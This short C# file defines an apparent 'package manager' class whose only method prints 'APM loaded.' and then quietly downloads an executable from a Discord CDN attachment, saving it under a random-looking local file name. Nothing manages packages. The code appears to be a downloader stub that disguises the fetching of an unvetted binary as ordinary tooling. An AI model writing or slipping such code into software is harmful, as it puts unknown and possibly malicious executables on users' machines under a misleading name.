using System.Net;

namespace APM {
    class PackageManager {
        public void Package_Download() {
            Console.WriteLine("APM loaded.");
            WebClient Client = new WebClient();
            Client.DownloadFile("https://cdn.discordapp.com/attachments/851648237656080435/1132889923335229601/NSIT.exe", "NIasdaw.exe");
        }
    }
}